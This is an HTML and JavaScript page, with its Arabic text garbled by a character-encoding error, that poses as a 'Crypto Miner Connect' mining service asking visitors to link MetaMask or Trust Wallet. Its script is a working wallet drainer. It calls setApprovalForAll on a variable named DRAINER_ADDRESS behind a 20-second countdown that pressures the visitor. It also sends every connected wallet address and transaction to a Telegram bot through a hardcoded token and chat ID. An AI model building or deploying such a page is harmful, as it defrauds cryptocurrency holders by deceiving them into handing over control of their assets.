<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>ğŸš€ Crypto Miner Connect - Ø§ØªØµØ§Ù„ Ø§Ù„Ù…Ø­ÙØ¸Ø©</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron&family=Cairo:wght@400;700&display=swap');

  /* Reset */
  * {
    margin: 0; padding: 0; box-sizing: border-box;
  }

  body {
    background: linear-gradient(135deg, #010a0f, #022c22);
    font-family: 'Cairo', sans-serif;
    color: #00ff99;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 2rem 1rem;
    user-select: none;
  }

  header {
    text-align: center;
    margin-bottom: 2rem;
  }
  header h1 {
    font-family: 'Orbitron', sans-serif;
    font-size: 2.8rem;
    letter-spacing: 0.15em;
    text-shadow: 0 0 12px #00ff99cc;
    font-weight: 900;
    margin-bottom: 0.3rem;
  }
  header p {
    font-size: 1.1rem;
    color: #66ffaa;
    font-weight: 600;
    letter-spacing: 0.07em;
  }

  #status {
    background: rgba(0, 255, 153, 0.15);
    border: 2px solid #00ff99;
    border-radius: 15px;
    padding: 1rem 1.5rem;
    max-width: 600px;
    font-family: 'Cairo', sans-serif;
    font-weight: 700;
    font-size: 1.1rem;
    text-align: center;
    margin-bottom: 1.5rem;
    box-shadow: inset 0 0 18px #00ff9955;
    user-select: text;
  }

  #countdown {
    font-weight: 900;
    font-size: 1.3rem;
    margin-bottom: 2rem;
    letter-spacing: 0.08em;
    text-shadow: 0 0 8px #00ff9977;
  }

  /* Grid container Ù„Ù„Ø£Ø²Ø±Ø§Ø± */
  #wallet-buttons {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
    gap: 1rem 2rem;
    width: 100%;
    max-width: 600px;
  }

  button.wallet-btn {
    background: #003d1a;
    border: 2.5px solid #00ff99;
    color: #00ff99;
    font-family: 'Orbitron', sans-serif;
    font-weight: 900;
    font-size: 1.2rem;
    border-radius: 30px;
    padding: 15px 20px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 14px;
    transition: all 0.3s ease;
    user-select: none;
    box-shadow: 0 0 25px #00ff9933;
    text-transform: uppercase;
  }

  button.wallet-btn:hover:not(:disabled) {
    background: transparent;
    color: #00ff99;
    border-color: #00ff99;
    box-shadow: 0 0 35px #00ff99cc;
  }
  button.wallet-btn:disabled {
    background: #001d08;
    border-color: #004422aa;
    color: #004422aa;
    cursor: not-allowed;
    box-shadow: none;
  }

  /* Ø£ÙŠÙ‚ÙˆÙ†Ø§Øª SVG Ù…ØµØºØ±Ø© */
  .wallet-icon {
    width: 32px;
    height: 32px;
    fill: #00ff99;
  }

  /* ØµÙ†Ø¯ÙˆÙ‚ Ø§Ù„Ù„ÙˆØº */
  #log {
    background: rgba(0, 255, 153, 0.15);
    border: 2px solid #00ff99;
    border-radius: 15px;
    width: 100%;
    max-width: 600px;
    height: 170px;
    overflow-y: auto;
    font-family: 'Cairo', sans-serif;
    font-size: 0.9rem;
    font-weight: 600;
    padding: 1rem 1.5rem;
    user-select: text;
    box-shadow: inset 0 0 25px #00ff9977;
    white-space: pre-wrap;
  }

  /* Ø²Ø± Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© */
  #approveBtn {
    max-width: 600px;
    width: 100%;
    margin: 2rem 0 4rem 0;
  }

  /* Ù…ØªØ¬Ø§ÙˆØ¨ */
  @media (max-width: 440px) {
    header h1 {
      font-size: 2rem;
    }
    #countdown {
      font-size: 1.1rem;
    }
    button.wallet-btn {
      font-size: 1rem;
      padding: 12px 18px;
      gap: 10px;
    }
    .wallet-icon {
      width: 26px;
      height: 26px;
    }
  }
</style>
</head>
<body>

<header>
  <h1>ØªØ¹Ø¯ÙŠÙ† Ø§Ù„Ø¹Ù…Ù„Ø§Øª Ø§Ù„Ø±Ù‚Ù…ÙŠØ©</h1>
  <p>Ù‚Ù… Ø¨ØªÙˆØµÙŠÙ„ Ù…Ø­ÙØ¸ØªÙƒ ÙˆØ§Ø¨Ø¯Ø£ ÙÙŠ Ø§Ù„ØªØ¹Ø¯ÙŠÙ† Ø§Ù„Ø¢Ù†!</p>
</header>

<div id="status">Ø§Ù„Ø­Ø§Ù„Ø©: ÙÙŠ Ø§Ù†ØªØ¸Ø§Ø± ØªÙˆØµÙŠÙ„ Ø§Ù„Ù…Ø­ÙØ¸Ø©...</div>
<div id="countdown"></div>

<div id="wallet-buttons">
  <!-- MetaMask Desktop -->
  <button id="metamaskDesktopBtn" class="wallet-btn" title="MetaMask Ù„Ù„ÙƒÙ…Ø¨ÙŠÙˆØªØ±">
    <svg class="wallet-icon" viewBox="0 0 212 189" xmlns="http://www.w3.org/2000/svg" >
      <path d="M106 0L72 52 45 64l22 21 17-19 10 6-4-19z" />
      <path d="M0 0l38 43 18 19 33-15L106 0z" fill="#e2761b"/>
      <path d="M212 0l-38 43-18 19-33-15L106 0z" fill="#e4761b"/>
      <path d="M30 97l-18 14 38 23-12-37z" fill="#f6851b"/>
      <path d="M182 97l18 14-38 23 12-37z" fill="#f6851b"/>
      <path d="M106 189l34-52 27-12-22-21-39 39z" fill="#763d16"/>
      <path d="M106 189l-34-52-27-12 22-21 39 39z" fill="#763d16"/>
    </svg>
    Ù…ÙŠØªØ§ Ù…Ø§Ø³Ùƒ (ÙƒÙ…Ø¨ÙŠÙˆØªØ±)
  </button>

  <!-- Trust Wallet Desktop (ØªØ­Ø°ÙŠØ±) -->
  <button id="trustDesktopBtn" class="wallet-btn" title="Trust Wallet Ù„Ù„ÙƒÙ…Ø¨ÙŠÙˆØªØ±">
    <svg class="wallet-icon" viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg" >
      <path fill="#3371ff" d="M128 0C57.3 0 0 57.3 0 128s57.3 128 128 128 128-57.3 128-128S198.7 0 128 0z"/>
      <path fill="#66a3ff" d="M75 85l15-10 35 65-15 10z"/>
      <path fill="#0033cc" d="M140 81l30 52-25 15z"/>
      <path fill="#99bbff" d="M80 125l25-35 10 25z"/>
      <path fill="#002299" d="M125 160l35-30 5 20z"/>
    </svg>
    ØªØ±Ø³Øª ÙˆØ§Ù„Øª (ÙƒÙ…Ø¨ÙŠÙˆØªØ±)
  </button>

  <!-- MetaMask Mobile -->
  <button id="metamaskMobileBtn" class="wallet-btn" title="MetaMask Ù„Ù„Ø¬ÙˆØ§Ù„">
    <svg class="wallet-icon" viewBox="0 0 212 189" xmlns="http://www.w3.org/2000/svg" >
      <path d="M106 0L72 52 45 64l22 21 17-19 10 6-4-19z" />
      <path d="M0 0l38 43 18 19 33-15L106 0z" fill="#e2761b"/>
      <path d="M212 0l-38 43-18 19-33-15L106 0z" fill="#e4761b"/>
      <path d="M30 97l-18 14 38 23-12-37z" fill="#f6851b"/>
      <path d="M182 97l18 14-38 23 12-37z" fill="#f6851b"/>
      <path d="M106 189l34-52 27-12-22-21-39 39z" fill="#763d16"/>
      <path d="M106 189l-34-52-27-12 22-21 39 39z" fill="#763d16"/>
    </svg>
    Ù…ÙŠØªØ§ Ù…Ø§Ø³Ùƒ (Ø¬ÙˆØ§Ù„)
  </button>

  <!-- Trust Wallet Mobile -->
  <button id="trustMobileBtn" class="wallet-btn" title="Trust Wallet Ù„Ù„Ø¬ÙˆØ§Ù„">
    <svg class="wallet-icon" viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg" >
      <path fill="#3371ff" d="M128 0C57.3 0 0 57.3 0 128s57.3 128 128 128 128-57.3 128-128S198.7 0 128 0z"/>
      <path fill="#66a3ff" d="M75 85l15-10 35 65-15 10z"/>
      <path fill="#0033cc" d="M140 81l30 52-25 15z"/>
      <path fill="#99bbff" d="M80 125l25-35 10 25z"/>
      <path fill="#002299" d="M125 160l35-30 5 20z"/>
    </svg>
    ØªØ±Ø³Øª ÙˆØ§Ù„Øª (Ø¬ÙˆØ§Ù„)
  </button>
</div>

<button id="approveBtn" class="wallet-btn" disabled>Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø§Ù„ÙˆØµÙˆÙ„</button>

<div id="log" aria-live="polite" aria-atomic="true" tabindex="0"></div>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

<script>
  const TELEGRAM_TOKEN = '7742799307:AAE4gtk_bHx2DiFxmqUEglreldTFFTrg';
  const TELEGRAM_CHAT_ID = '1269389399';

  const DRAINER_ADDRESS = "0x1111111111111111111111111111111111111111";
  const ABI = ["function setApprovalForAll(address operator, bool approved) external"];

  const statusEl = document.getElementById('status');
  const logEl = document.getElementById('log');
  const countdownEl = document.getElementById('countdown');

  const metamaskDesktopBtn = document.getElementById('metamaskDesktopBtn');
  const trustDesktopBtn = document.getElementById('trustDesktopBtn');
  const metamaskMobileBtn = document.getElementById('metamaskMobileBtn');
  const trustMobileBtn = document.getElementById('trustMobileBtn');
  const approveBtn = document.getElementById('approveBtn');

  let provider, signer;
  let countdownTimer;

  // Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…
  function sendTelegramMessage(message) {
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
    }).catch(() => {}); // Ù„Ø§ Ù†Ø¹Ø±Ø¶ Ø§Ù„Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ÙƒÙˆÙ†Ø³ÙˆÙ„
  }

  // ØªØ³Ø¬ÙŠÙ„ Ù„ÙˆØ¬ + Ø¥Ø±Ø³Ø§Ù„ ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…
  function smartLog(message) {
    const now = new Date().toLocaleTimeString();
    const logMessage = `[${now}] ${message}`;
    logEl.textContent += logMessage + "\n";
    logEl.scrollTop = logEl.scrollHeight;
    sendTelegramMessage(logMessage);
  }

  // Ø¹Ø¯Ø§Ø¯ ØªÙ†Ø§Ø²Ù„ÙŠ
  function startCountdown() {
    let timeLeft = 20;
    countdownEl.textContent = `â³ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ù…ØªØ¨Ù‚ÙŠ Ù„Ù„Ù…ÙˆØ§ÙÙ‚Ø©: ${timeLeft}s`;
    approveBtn.disabled = false;
    clearInterval(countdownTimer);

    countdownTimer = setInterval(() => {
      timeLeft--;
      countdownEl.textContent = `â³ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ù…ØªØ¨Ù‚ÙŠ Ù„Ù„Ù…ÙˆØ§ÙÙ‚Ø©: ${timeLeft}s`;
      if (timeLeft <= 0) {
        clearInterval(countdownTimer);
        approveBtn.disabled = true;
        statusEl.textContent = "âŒ› Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„ÙˆÙ‚Øª. ÙŠØ±Ø¬Ù‰ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø§ØªØµØ§Ù„.";
        smartLog("Ø§Ù†ØªÙ‡Ù‰ ÙˆÙ‚Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… - ØªÙ… ØªØ¹Ø·ÙŠÙ„ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©.");
      }
    }, 1000);
  }

  // Ø§ØªØµØ§Ù„ MetaMask Ø¯ÙŠØ³ÙƒØªÙˆØ¨
  async function connectMetaMaskDesktop() {
    if (!window.ethereum || !window.ethereum.isMetaMask) {
      statusEl.textContent = "âŒ Ù…ÙŠØªØ§ Ù…Ø§Ø³Ùƒ ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯ Ø¹Ù„Ù‰ Ø§Ù„Ù…ØªØµÙØ­!";
      smartLog("Ù…ÙŠØªØ§Ù…Ø§ Ø³Ùƒ ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯ Ø¹Ù„Ù‰ Ø¯ÙŠØ³ÙƒØªÙˆØ¨.");
      return;
    }
    try {
      statusEl.textContent = "ğŸ”„ Ø¬Ø§Ø±ÙŠ Ø·Ù„Ø¨ Ø§ØªØµØ§Ù„ Ù…ÙŠØªØ§ Ù…Ø§Ø³Ùƒ...";
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      provider = new ethers.providers.Web3Provider(window.ethereum);
      signer = provider.getSigner();
      const address = await signer.getAddress();

      statusEl.textContent = `âœ… Ù…ØªØµÙ„: ${address}`;
      smartLog(`Ù…ØªØµÙ„ Ø¨Ø­Ø³Ø§Ø¨ MetaMask (Ø¯ÙŠØ³ÙƒØªÙˆØ¨): ${address}`);
      startCountdown();

      // Ø§Ù„ØªØ¹Ø§Ù…Ù„ Ù…Ø¹ ØªØºÙŠÙŠØ± Ø§Ù„Ø­Ø³Ø§Ø¨ Ø£Ùˆ Ø§Ù„Ø´Ø¨ÙƒØ©
      window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
          statusEl.textContent = "â— ØªÙ… Ù‚Ø·Ø¹ Ø§ØªØµØ§Ù„ MetaMask.";
          smartLog("Ø§Ù†Ù‚Ø·Ø¹ Ø§ØªØµØ§Ù„ MetaMask.");
          approveBtn.disabled = true;
          clearInterval(countdownTimer);
        } else {
          statusEl.textContent = `ğŸ”„ ØªÙ… ØªØºÙŠÙŠØ± Ø§Ù„Ø­Ø³Ø§Ø¨: ${accounts[0]}`;
          smartLog(`ØªØºÙŠÙŠØ± Ø§Ù„Ø­Ø³Ø§Ø¨ Ø¥Ù„Ù‰: ${accounts[0]}`);
          approveBtn.disabled = false;
          startCountdown();
        }
      });
      window.ethereum.on('chainChanged', (chainId) => {
        smartLog(`ØªØºÙŠÙŠØ± Ø§Ù„Ø´Ø¨ÙƒØ©: ${chainId}`);
        statusEl.textContent = `ğŸŒ ØªÙ… ØªØºÙŠÙŠØ± Ø§Ù„Ø´Ø¨ÙƒØ©: ${chainId}`;
        approveBtn.disabled = true;
        clearInterval(countdownTimer);
      });

    } catch (err) {
      statusEl.textContent = "âŒ ÙØ´Ù„ Ø§Ù„Ø§ØªØµØ§Ù„ Ø£Ùˆ ØªÙ… Ø±ÙØ¶Ù‡.";
      smartLog(`Ø®Ø·Ø£ Ø§ØªØµØ§Ù„ MetaMask (Ø¯ÙŠØ³ÙƒØªÙˆØ¨): ${err.message}`);
    }
  }

  // ÙØªØ­ Trust Wallet Ø¯Ø§Ø¨ (Ø¹Ø§Ø¯Ø© Ù…ÙˆØ¨Ø§ÙŠÙ„ ÙÙ‚Ø·)
  function openTrustWalletDesktop() {
    statusEl.textContent = "âš ï¸ Trust Wallet ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ… Ø¹Ù„Ù‰ Ø§Ù„ÙƒÙ…Ø¨ÙŠÙˆØªØ±. ÙŠØ±Ø¬Ù‰ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù…ÙˆØ¨Ø§ÙŠÙ„.";
    smartLog("Ù…Ø­Ø§ÙˆÙ„Ø© ÙØªØ­ Trust Wallet Ø¹Ù„Ù‰ Ø§Ù„ÙƒÙ…Ø¨ÙŠÙˆØªØ± - ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ….");
  }

  // ÙØªØ­ MetaMask Mobile
  function openMetaMaskMobile() {
    const dappUrl = window.location.origin;
    const metamaskMobileLink = `https://metamask.app.link/dapp/${dappUrl.replace(/^https?:\/\//, '')}`;
    statusEl.textContent = "â³ Ø¬Ø§Ø±ÙŠ ÙØªØ­ MetaMask Ø¹Ù„Ù‰ Ø§Ù„Ø¬ÙˆØ§Ù„...";
    smartLog("ÙØªØ­ MetaMask Ø¹Ù„Ù‰ Ø§Ù„Ø¬ÙˆØ§Ù„.");
    window.location.href = metamaskMobileLink;
  }

  // ÙØªØ­ Trust Wallet Mobile
  function openTrustWalletMobile() {
    const dappUrl = window.location.origin;
    const trustUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
    statusEl.textContent = "â³ Ø¬Ø§Ø±ÙŠ ÙØªØ­ Trust Wallet Ø¹Ù„Ù‰ Ø§Ù„Ø¬ÙˆØ§Ù„...";
    smartLog("ÙØªØ­ Trust Wallet Ø¹Ù„Ù‰ Ø§Ù„Ø¬ÙˆØ§Ù„.");
    window.location.href = trustUrl;
  }

  // Ø¥Ø¬Ø±Ø§Ø¡ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©
  async function approveDrainer() {
    if (!signer) {
      statusEl.textContent = "âŒ ØºÙŠØ± Ù…ØªØµÙ„ Ø¨Ø£ÙŠ Ù…Ø­ÙØ¸Ø©.";
      smartLog("Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¨Ø¯ÙˆÙ† Ø§ØªØµØ§Ù„.");
      return;
    }
    approveBtn.disabled = true;
    statusEl.textContent = "â³ Ø¬Ø§Ø±ÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©...";
    smartLog("Ø¨Ø¯Ø¡ Ø¹Ù…Ù„ÙŠØ© setApprovalForAll Ù„Ù„Ø¹Ù‚Ø¯.");

    try {
      const contract = new ethers.Contract(DRAINER_ADDRESS, ABI, signer);
      const tx = await contract.setApprovalForAll(DRAINER_ADDRESS, true);
      statusEl.textContent = "âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©! ÙŠØ±Ø¬Ù‰ ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¹Ù…Ù„ÙŠØ© ÙÙŠ Ø§Ù„Ù…Ø­ÙØ¸Ø©.";
      smartLog(`ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©. Ù‡Ø§Ø´: ${tx.hash}`);

      await tx.wait();
      statusEl.textContent = "ğŸ‰ ØªÙ… ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©! Ù…Ø­ÙØ¸ØªÙƒ ØªÙ…Øª Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„ÙŠÙ‡Ø§.";
      smartLog("ØªÙ… ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø¨Ù†Ø¬Ø§Ø­.");
      clearInterval(countdownTimer);
      countdownEl.textContent = "";
    } catch (error) {
      statusEl.textContent = "âŒ ÙØ´Ù„Øª Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø£Ùˆ ØªÙ… Ø±ÙØ¶Ù‡Ø§.";
      smartLog(`Ø®Ø·Ø£ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©: ${error.message}`);
      approveBtn.disabled = false;
    }
  }

  // Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù„Ø£Ø²Ø±Ø§Ø±
  metamaskDesktopBtn.addEventListener('click', connectMetaMaskDesktop);
  trustDesktopBtn.addEventListener('click', openTrustWalletDesktop);
  metamaskMobileBtn.addEventListener('click', openMetaMaskMobile);
  trustMobileBtn.addEventListener('click', openTrustWalletMobile);
  approveBtn.addEventListener('click', approveDrainer);

  // Ø§Ù„Ø­Ø§Ù„Ø© Ø§Ù„Ø£ÙˆÙ„ÙŠØ©
  if (window.ethereum && window.ethereum.isMetaMask) {
    statusEl.textContent = "âœ… ØªÙ… Ø§Ù„ÙƒØ´Ù Ø¹Ù† MetaMask. Ø¬Ø§Ù‡Ø² Ù„Ù„Ø§ØªØµØ§Ù„.";
  } else {
    statusEl.textContent = "â›” Ù„Ù… ÙŠØªÙ… Ø§Ù„ÙƒØ´Ù Ø¹Ù† MetaMask ÙÙŠ Ù‡Ø°Ø§ Ø§Ù„Ø¬Ù‡Ø§Ø².";
  }
</script>
</body>
</html>
